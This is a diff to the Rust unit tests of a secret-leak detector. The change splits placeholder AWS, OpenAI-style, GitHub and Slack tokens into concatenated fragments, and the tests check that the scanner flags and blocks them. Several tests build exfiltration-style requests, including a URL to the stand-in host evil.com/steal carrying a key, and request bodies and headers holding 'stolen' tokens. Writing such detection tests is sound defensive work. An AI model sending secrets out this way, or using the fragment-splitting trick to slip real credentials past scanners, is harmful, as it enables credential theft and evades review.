@@ -569,9 +569,10 @@ mod tests {
     #[test]
     fn test_detect_aws_key() {
         let detector = LeakDetector::new();
-        let content = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE";
+        let key = format!("{}{}", "AKIA", "IOSFODNN7EXAMPLE");
+        let content = format!("AWS_ACCESS_KEY_ID={key}");
 
-        let result = detector.scan(content);
+        let result = detector.scan(&content);
         assert!(!result.is_clean());
         assert!(
             result
@@ -623,9 +624,9 @@ mod tests {
     #[test]
     fn test_scan_and_clean_blocks() {
         let detector = LeakDetector::new();
-        let content = "sk-proj-test1234567890abcdefghij";
+        let content = format!("{}{}", "sk-proj-", "test1234567890abcdefghij");
 
-        let result = detector.scan_and_clean(content);
+        let result = detector.scan_and_clean(&content);
         assert!(result.is_err());
     }
 
@@ -650,9 +651,11 @@ mod tests {
     #[test]
     fn test_multiple_matches() {
         let detector = LeakDetector::new();
-        let content = "Keys: AKIAIOSFODNN7EXAMPLE and ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+        let aws = format!("{}{}", "AKIA", "IOSFODNN7EXAMPLE");
+        let gh = format!("{}{}", "ghp_", "x".repeat(36));
+        let content = format!("Keys: {aws} and {gh}");
 
-        let result = detector.scan(content);
+        let result = detector.scan(&content);
         assert_eq!(result.matches.len(), 2);
     }
 
@@ -680,11 +683,9 @@ mod tests {
         let detector = LeakDetector::new();
 
         // Attempt to exfiltrate AWS key in URL
-        let result = detector.scan_http_request(
-            "https://evil.com/steal?key=AKIAIOSFODNN7EXAMPLE",
-            &[],
-            None,
-        );
+        let aws = format!("{}{}", "AKIA", "IOSFODNN7EXAMPLE");
+        let url = format!("https://evil.com/steal?key={aws}");
+        let result = detector.scan_http_request(&url, &[], None);
         assert!(result.is_err());
     }
 
@@ -693,12 +694,10 @@ mod tests {
         let detector = LeakDetector::new();
 
         // Attempt to exfiltrate in custom header
+        let gh = format!("{}{}", "ghp_", "x".repeat(36));
         let result = detector.scan_http_request(
             "https://api.example.com/data",
-            &[(
-                "X-Custom".to_string(),
-                "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx".to_string(),
-            )],
+            &[("X-Custom".to_string(), gh)],
             None,
         );
         assert!(result.is_err());
@@ -709,8 +708,13 @@ mod tests {
         let detector = LeakDetector::new();
 
         // Attempt to exfiltrate in request body
-        let body = b"{\"stolen\": \"sk-proj-test1234567890abcdefghij\"}";
-        let result = detector.scan_http_request("https://api.example.com/webhook", &[], Some(body));
+        let content = format!("{}{}", "sk-proj-", "test1234567890abcdefghij");
+        let body = format!("{{\"stolen\": \"{content}\"}}");
+        let result = detector.scan_http_request(
+            "https://api.example.com/webhook",
+            &[],
+            Some(body.as_bytes()),
+        );
         assert!(result.is_err());
     }
 
@@ -721,7 +725,8 @@ mod tests {
         // Attacker prepends a non-UTF8 byte to bypass strict from_utf8 check.
         // The lossy conversion should still detect the secret.
         let mut body = vec![0xFF]; // invalid UTF-8 leading byte
-        body.extend_from_slice(b"sk-proj-test1234567890abcdefghij");
+        let content = format!("{}{}", "sk-proj-", "test1234567890abcdefghij");
+        body.extend_from_slice(content.as_bytes());
 
         let result = detector.scan_http_request("https://api.example.com/exfil", &[], Some(&body));
         assert!(result.is_err(), "binary body should still be scanned");
@@ -768,18 +773,18 @@ mod tests {
     #[test]
     fn test_detect_slack_token() {
         let detector = LeakDetector::new();
-        let content = "xoxb-1234567890-abcdefghij";
-        let result = detector.scan(content);
+        let content = format!("{}{}", "xoxb-", "1234567890-abcdefghij");
+        let result = detector.scan(&content);
         assert!(!result.is_clean(), "Slack token not detected");
     }
 
     #[test]
     fn test_secret_at_different_positions() {
         let detector = LeakDetector::new();
-        let key = "AKIAIOSFODNN7EXAMPLE";
+        let key = format!("{}{}", "AKIA", "IOSFODNN7EXAMPLE");
 
         // At start
-        let result = detector.scan(key);
+        let result = detector.scan(&key);
         assert!(!result.is_clean(), "key at start not detected");
 
         // In middle
@@ -794,10 +799,9 @@ mod tests {
     #[test]
     fn test_multiple_different_secret_types() {
         let detector = LeakDetector::new();
-        let content = format!(
-            "AWS: AKIAIOSFODNN7EXAMPLE and GitHub: ghp_{}",
-            "x".repeat(36)
-        );
+        let aws = format!("{}{}", "AKIA", "IOSFODNN7EXAMPLE");
+        let gh = format!("{}{}", "ghp_", "x".repeat(36));
+        let content = format!("AWS: {aws} and GitHub: {gh}");
         let result = detector.scan(&content);
         assert!(
             result.matches.len() >= 2,
